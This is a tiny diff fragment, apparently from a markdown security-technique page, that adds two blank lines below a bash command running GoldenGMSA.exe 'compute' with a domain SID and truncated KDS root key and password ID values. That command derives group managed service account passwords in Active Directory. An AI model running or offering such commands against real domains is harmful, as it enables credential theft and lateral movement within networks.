@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:25:56.697280+00:00'
 ```bash
 GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA
 ```
+
+
